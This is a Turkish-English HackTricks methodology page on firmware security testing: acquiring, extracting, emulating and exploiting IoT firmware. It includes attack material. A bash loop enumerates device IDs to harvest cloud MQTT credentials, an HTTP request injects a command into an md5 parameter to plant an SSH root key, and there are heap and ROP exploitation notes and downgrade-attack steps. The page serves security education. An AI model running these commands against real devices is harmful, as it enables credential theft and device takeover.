# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, cihazların doğru şekilde çalışmasını sağlayan ve hardware bileşenleri ile kullanıcıların etkileşimde bulunduğu software arasındaki iletişimi yöneten ve kolaylaştıran temel software'dir. Kalıcı bellekte saklanır; böylece device açıldığı andan itibaren hayati talimatlara erişebilir ve operating system'in başlatılmasını sağlar. Firmware'i incelemek ve potansiyel olarak değiştirmek, security vulnerabilities belirlemede kritik bir adımdır.

## **Gathering Information**

**Gathering information**, bir device'ın yapısını ve kullandığı technologies'i anlamada kritik bir ilk adımdır. Bu süreç, şu konularda veri toplamayı içerir:

- CPU architecture ve çalıştırdığı operating system
- Bootloader ayrıntıları
- Hardware yerleşimi ve datasheet'ler
- Codebase metrikleri ve source konumları
- External libraries ve license türleri
- Update geçmişleri ve düzenleyici certifications
- Architectural ve flow diagrams
- Security assessments ve tespit edilen vulnerabilities

Bu amaçla, **open-source intelligence (OSINT)** tools çok değerlidir; ayrıca mevcut open-source software bileşenlerinin manuel ve automated review süreçleriyle analizi de öyledir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi tools, potansiyel sorunları bulmak için kullanılabilecek ücretsiz static analysis sunar.

## **Acquiring the Firmware**

Firmware elde etmek, her birinin kendi zorluk seviyesine sahip olduğu çeşitli yollarla yapılabilir:

- Kaynaktan (**Directly**) almak (developers, manufacturers)
- Verilen instructions'tan (**Building**) oluşturmak
- Official support sites'tan (**Downloading**) indirmek
- Hosted firmware dosyalarını bulmak için **Google dork** queries kullanmak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi tools ile doğrudan **cloud storage** erişmek
- **Updates**'i man-in-the-middle techniques ile intercept etmek
- **UART**, **JTAG** veya **PICit** gibi connections üzerinden device'tan **Extracting** yapmak
- Device communication içindeki update requests'leri **Sniffing** yapmak
- **Hardcoded update endpoints**'leri belirlemek ve kullanmak
- Bootloader'dan veya network'ten **Dumping** yapmak
- Diğer tüm yöntemler başarısız olduğunda uygun hardware tools kullanarak storage chip'i **Removing and reading** yapmak

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Analyzing the firmware

Now that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools you can use for that:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Eğer bu araçlarla fazla bir şey bulamazsan, `binwalk -E <bin>` ile görüntünün **entropy** değerini kontrol et; entropy düşükse, şifrelenmiş olması pek olası değildir. Entropy yüksekse, büyük olasılıkla şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca, gömülü **firmware** içindeki **files**’ları çıkarmak için şu araçları kullanabilirsin:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Veya dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsin.

### Filesystem'i Getting

Önceki yorumlu araçlarla `binwalk -ev <bin>` komutunu kullandıysan, muhtemelen **filesystem**’i **extract** etmiş olmalısın.\
Binwalk genellikle bunu, **filesystem type** adına sahip bir **folder** içine çıkarır; bu isim çoğunlukla şu türlerden biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Bazen binwalk, signatures içinde **filesystem**’in magic byte’ını bulamayacaktır. Bu durumlarda, binwalk ile **filesystem**’in offset’ini bul ve sıkıştırılmış **filesystem**’i binary’den carve et; ardından aşağıdaki adımları kullanarak türüne göre **filesystem**’i manuel olarak extract et.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Aşağıdaki **dd command** ile Squashfs filesystem'ini carving yapın.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak, aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanıldı)

`$ unsquashfs dir.squashfs`

Dosyalar sonrasında "`squashfs-root`" dizininde olacaktır.

- CPIO archive dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems için

`$ jefferson rootfsfile.jffs2`

- NAND flash ile ubifs filesystems için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware'i Analiz Etme

Firmware elde edildikten sonra, yapısını ve olası zafiyetleri anlamak için onu parçalarına ayırmak önemlidir. Bu süreç, firmware image içinden değerli verileri analiz etmek ve çıkarmak için çeşitli tools kullanmayı içerir.

### İlk Analiz Tools

Binary file'ın (bundan sonra `<bin>` olarak anılacaktır) ilk incelemesi için bir dizi command sağlanmıştır. Bu commands, file type'larını belirlemeye, strings çıkarmaya, binary data'yı analiz etmeye ve partition ile filesystem ayrıntılarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Görüntünün şifreleme durumunu değerlendirmek için **entropy**, `binwalk -E <bin>` ile kontrol edilir. Düşük entropy, şifreleme eksikliğini düşündürürken, yüksek entropy olası şifreleme veya compression olduğunu gösterir.

**Embedded files** çıkarmak için, **file-data-carving-recovery-tools** dokümantasyonu ve dosya incelemesi için **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Filesystem'i Çıkarmak

`binwalk -ev <bin>` kullanarak, genellikle filesystem çıkarılabilir; çoğu zaman filesystem türünün adını taşıyan bir dizine (ör. squashfs, ubifs) alınır. Ancak, **binwalk** eksik magic bytes nedeniyle filesystem türünü tanıyamadığında, manuel extraction gerekir. Bu, filesystem'in offset değerini bulmak için `binwalk` kullanmayı ve ardından filesystem'i ayırmak için `dd` komutunu içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daha sonra, filesystem türüne bağlı olarak (örn. squashfs, cpio, jffs2, ubifs), içeriği manuel olarak çıkarmak için farklı komutlar kullanılır.

### Filesystem Analysis

Filesystem çıkarıldıktan sonra, security flaw araması başlar. Güvensiz network daemon’lar, hardcoded credentials, API endpoint’leri, update server işlevleri, derlenmemiş code, startup script’leri ve offline analysis için derlenmiş binary’ler incelenir.

**Kontrol edilecek önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı credentials’ları için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL certificates ve keys
- Olası vulnerabilities için configuration ve script dosyaları
- Daha fazla analysis için embedded binary’ler
- Yaygın IoT device web server’ları ve binary’ler

Filesystem içinde hassas information ve vulnerabilities ortaya çıkarmaya yardımcı olan birkaç tool vardır:

- Hassas information araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analysis için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static ve dynamic analysis için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Security Checks on Compiled Binaries

Filesystem’de bulunan hem source code hem de compiled binary’ler vulnerabilities açısından dikkatle incelenmelidir. Unix binary’leri için **checksec.sh** ve Windows binary’leri için **PESecurity** gibi tools, istismar edilebilecek korunmasız binary’leri tespit etmeye yardımcı olur.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Birçok IoT hub, cihaz başına configuration bilgisini şu formata benzeyen bir cloud endpoint’inden çeker:

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis sırasında `<token>` değerinin yerel olarak device ID’den hardcoded secret kullanılarak türetildiğini bulabilirsiniz; örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve uppercase hex olarak temsil edilir

Bu tasarım, deviceId ve STATIC_KEY’yi öğrenen herkesin URL’yi yeniden oluşturup cloud config’i çekebilmesini sağlar; bu da çoğu zaman plaintext MQTT credentials ve topic prefix’lerini açığa çıkarır.

Pratik iş akışı:

1) UART boot logs’tan deviceId çıkarın

- 3.3V UART adapter (TX/RX/GND) bağlayın ve logs’u yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cloud config URL pattern ve broker adresini yazdıran satırları arayın, örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'den STATIC_KEY ve token algoritmasını recover edin

- Binary'leri Ghidra/radare2 içine yükleyin ve config path ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (örn. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash ile derive edin ve digest'i uppercase yapın:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config ve MQTT credentials topla

- URL’yi oluştur ve curl ile JSON’u çek; secrets çıkarmak için jq ile parse et:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT ve zayıf topic ACL'lerini kötüye kullanın (varsa)

- Kurtarılan kimlik bilgilerini maintenance topic'lerine abone olmak ve hassas olayları aramak için kullanın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Tahmin edilebilir device ID'lerini enumerate et (ölçekte, yetkiyle)

- Birçok ekosistem, vendor OUI/product/type bytes ile başlayan ve ardından sıralı bir suffix içeren yapılar kullanır.
- Aday ID'leri iterate edebilir, token'ları derive edebilir ve config'leri programmatically fetch edebilirsin:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Mass enumeration denemeden önce her zaman açık yetkilendirme alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden sırları geri kazanmak için emülasyon veya static analysis tercih edin.


Firmware emülasyonu süreci, bir cihazın çalışmasının ya da tek bir programın **dynamic analysis** yapılmasını sağlar. Bu yaklaşım, hardware veya architecture bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root filesystem'i veya belirli binaries'i, Raspberry Pi gibi architecture ve endianness uyumlu bir cihaza ya da önceden oluşturulmuş bir virtual machine'e aktarmak, daha ileri testing'i kolaylaştırabilir.

### Emulating Individual Binaries

Tek programları incelemek için, programın endianness'i ve CPU architecture'ını belirlemek kritiktir.

#### Example with MIPS Architecture

Bir MIPS architecture binary'sini emüle etmek için şu komut kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını kurmak için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` kullanılır ve little-endian binary'ler için `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emulation için `qemu-arm` emulator'ü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzeri tools, full firmware emulation işlemini kolaylaştırır; süreci otomatikleştirir ve dynamic analysis'e yardımcı olur.

## Dynamic Analysis in Practice

Bu aşamada, analysis için gerçek veya emulated bir device environment kullanılır. OS ve filesystem üzerinde shell access'i sürdürmek önemlidir. Emulation, hardware etkileşimlerini mükemmel biçimde taklit etmeyebilir; bu nedenle zaman zaman emulation restart gerekebilir. Analysis, filesystem'i yeniden incelemeli, exposed webpages ve network services'i exploit etmeli ve bootloader vulnerabilities'ını araştırmalıdır. Firmware integrity testleri, olası backdoor vulnerabilities'ını belirlemek için kritiktir.

## Runtime Analysis Techniques

Runtime analysis, gdb-multiarch, Frida ve Ghidra gibi tools kullanarak bir process veya binary ile kendi operating environment'inde etkileşime girmeyi; breakpoint'ler ayarlamayı ve fuzzing ile diğer teknikler üzerinden vulnerabilities belirlemeyi içerir.

Full debugger olmayan embedded target'lar için, **statically-linked `gdbserver` kopyasını** device'a aktarın ve uzaktan bağlanın:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub’larda RF yığını çoğu zaman bir **radio MCU** ve bir Linux userland process arasında bölünür. Faydalı bir workflow, yolu haritalamaktır:

1. Havada **RF frame**
2. radio MCU üzerinde **controller-side parser**
3. Linux’a iletilen **serial/UART text or TLV protocol** (örneğin `/dev/tty*`)
4. ana daemon içinde **application dispatcher**
5. **protocol-specific handler / state machine**

Bu mimari, tek bir reversing hedefi yerine iki hedef oluşturur. Controller binary radio frameleri `Group,Command,arg1,arg2,...` gibi textual bir protocol’e çeviriyorsa, şunları çıkar:

- **message groups** ve dispatch tabloları
- Hangi messages’in **network**’ten hangilerinin controller’ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator fields** (örneğin Zigbee `manufacturer_code` ve custom `cluster_command`)
- Hangi handler’ların yalnızca **commissioning**, discovery veya firmware/model download aşamalarında erişilebilir olduğu

Zigbee için özellikle pairing traffic’i capture et ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09`’a güvenip güvenmediğini kontrol et. Eğer öyleyse, commissioning traffic’i sniff etmek **Network Key**’i açığa çıkarabilir. Zigbee 3.0 install codes bu exposure’ı azaltır, bu yüzden test edilen cihazın bunları gerçekten enforce edip etmediğini not et.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands genellikle standardize cluster’lardan daha iyi bir hedeftir, çünkü bunlar daha az battle-tested validation ile **custom parsing code** ve internal **FSMs**’e beslenir.

Pratik workflow:

- Vendor-only handler’ı bulana kadar command dispatcher’ı reverse et.
- **FSM state**, **event**, **check**, **action** ve **next-state** tablolarını çıkar.
- Otomatik ilerleyen **transitional states** ile retry/error branches’i belirle; bunlar sonunda attacker-controlled state’i resetler veya free eder.
- Buggy handler’ın her zaman reachable olduğunu varsaymak yerine, vulnerable state’e girmek için hangi meşru protocol exchanges’in gerekli olduğunu doğrula.

Timing-sensitive protocol’lerde Python framework ile packet replay çok yavaş olabilir. Daha güvenilir bir yaklaşım, gerçek hardware üzerinde meşru bir device emüle etmektir (örneğin **nRF52840**) ve vendor-grade stack kullanmaktır; böylece doğru **endpoints**, **attributes** ve commissioning timing’i açığa çıkarabilirsin.

### Fragmented-download bug class in embedded daemons

Tekrarlayan bir firmware bug class, **fragmented blob/model/configuration downloads** içinde görünür:

1. **İlk fragment** (`offset == 0`) `ctx->total_size`’ı saklar ve `malloc(total_size)` ile allocate eder.
2. Sonraki fragment’lar yalnızca attacker-controlled **packet-local** alanları doğrular; örneğin `packet_total_size >= offset + chunk_len`.
3. Copy, **orijinal allocated size** kontrol edilmeden `memcpy(&ctx->buffer[offset], chunk, chunk_len)` ile yapılır.

Bu, attacker’a şunları gönderme imkânı verir:

- Küçük heap allocation zorlamak için **küçük** declared total size’lı geçerli bir ilk fragment.
- **Beklenen offset** ile daha büyük `chunk_len` içeren sonraki bir fragment.
- Yeni kontrolleri geçen ama yine de orijinal allocated buffer’ı taşıran forged packet-local size.

Vulnerable path commissioning logic’in arkasındaysa, exploitation malformed fragment’leri göndermeden önce hedefi beklenen model-download veya blob-download state’ine sokacak kadar **device emulation** içermelidir.

### Protocol-driven `free()` triggers

Embedded daemon’larda heap metadata exploitation tetiklemenin en kolay yolu çoğu zaman "cleanup’i beklemek" değil, **protocol's own error handling**’ini zorlamaktır:

- FSM’i **retry** veya **error** state’lerine itmek için malformed follow-up fragments gönder.
- Retry threshold’u aşarak daemon’ın **reset context** yapmasını ve corrupted buffer’ı free etmesini sağla.
- Process alakasız nedenlerle çökmeden önce allocator-side primitive’leri tetiklemek için bu öngörülebilir `free()`’yi kullan.

Bu, embedded Linux’teki **musl/uClibc/dlmalloc-like** allocators’a karşı özellikle faydalıdır; çünkü chunk metadata’nın bozulması unlink/unbin logic’i write primitive’e çevirebilir. Stabil bir pattern, gerçek bin pointers’ı hemen bozup process’i çökertmek yerine, allocator traversal’ını overflowed buffer içine staged **fake chunks**’a yönlendirmek için bir **size field**’ı bozmayı içerir.

## Binary Exploitation and Proof-of-Concept

Belirlenen vulnerability’ler için PoC geliştirmek, target architecture hakkında derin bir anlayış ve lower-level languages ile programlama gerektirir. Embedded sistemlerde binary runtime protections nadirdir, ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc’ye benzer fastbins kullanır. Daha sonraki büyük bir allocation `__malloc_consolidate()` tetikleyebilir; bu yüzden her fake chunk kontrolleri geçmelidir (makul size, `fd = 0` ve çevredeki chunk’ların "in use" görünmesi).
- **Non-PIE binaries under ASLR:** ASLR etkin olsa bile main binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri stabildir. Zaten valid heap chunk header’a benzeyen bir bölgeyi hedefleyerek fastbin allocation’ı bir **function pointer table** üzerine düşürebilirsin.
- **Parser-stopping NUL:** JSON parse edilirken payload içindeki bir `\x00`, parsing’i durdururken stack pivot/ROP chain için attacker-controlled trailing byte’ları koruyabilir.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, executable shellcode’u bilinen bir mapping içine yerleştirip ona jump edebilir.

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi operating systems, gerekli tools ile donatılmış pre-configured environment’lar sağlayarak firmware security testing için uygundur.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarında security assessment ve penetration testing yapmana yardımcı olmak için tasarlanmış bir distro’dur. Gerekli tüm tools önceden yüklenmiş pre-configured bir environment sağlayarak çok zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing tools ile önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing operating system.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Bir vendor firmware images için cryptographic signature checks uygulasa bile, **version rollback (downgrade) protection** çoğu zaman eksiktir. Boot- veya recovery-loader yalnızca embedded public key ile signature’ı doğruluyor ama flash edilen image’ın *version*’ını (veya monotonic counter’ını) karşılaştırmıyorsa, attacker geçerli signature taşıyan **older, vulnerable firmware**’i meşru biçimde kurabilir ve böylece patched vulnerabilities’i yeniden devreye sokabilir.

Tipik attack workflow:

1. **Daha eski signed image** edin
* Bunu vendor’ın public download portal’ından, CDN’inden veya support site’ından al.
* Companion mobile/desktop applications içinden çıkar (örneğin Android APK içinde `assets/firmware/` altında).
* VirusTotal, internet archives, forums vb. üçüncü taraf repository’lerden al.
2. Image’ı device’a herhangi bir exposed update channel üzerinden **upload** et veya **serve** et:
* Web UI, mobile-app API, USB, TFTP, MQTT, vb.
* Birçok consumer IoT device, Base64-encoded firmware blobs kabul eden, server-side decode eden ve recovery/upgrade tetikleyen *unauthenticated* HTTP(S) endpoints açar.
3. Downgrade’den sonra, daha yeni release’te patched edilmiş bir vulnerability’yi exploit et (örneğin daha sonra eklenmiş bir command-injection filter).
4. İsteğe bağlı olarak en son image’ı geri flash et veya persistence kazanıldıktan sonra detection’dan kaçınmak için updates’i disable et.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Vulnerable (downgraded) firmware içinde, `md5` parametresi doğrudan bir shell command içine sanitisation olmadan birleştirilir; bu da keyfi commands injection yapılmasına izin verir (burada – SSH key-based root access etkinleştirme). Sonraki firmware sürümleri temel bir character filter getirdi, ancak downgrade protection olmaması bu düzeltmeyi etkisiz kılar.

### Mobile Apps'ten Firmware Çıkarma

Birçok vendor, cihazı Bluetooth/Wi-Fi üzerinden update edebilmesi için companion mobile applications içine tam firmware images paketler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi paths altında şifrelenmemiş olarak saklanır. `apktool`, `ghidra` veya düz `unzip` gibi tools, fiziksel hardware'a dokunmadan signed images çıkarmanıza olanak tanır.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Güncelleme Mantığını Değerlendirme Kontrol Listesi

* *update endpoint*’inin taşıma/güvenlik kimlik doğrulaması yeterince korunuyor mu (TLS + authentication)?
* Cihaz, flash etmeden önce **version numbers** veya **monotonic anti-rollback counter** karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. ROM code tarafından signatures kontrol ediliyor mu)?
* userland code ek mantık kontrolleri yapıyor mu (ör. allowed partition map, model number)?
* *partial* veya *backup* update flow’ları aynı validation logic’i yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse, platform büyük olasılıkla rollback saldırılarına karşı savunmasızdır.

## Practice için vulnerable firmware

Firmware’de vulnerabilities keşfetmeyi pratik etmek için, başlangıç noktası olarak aşağıdaki vulnerable firmware projelerini kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Training ve Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
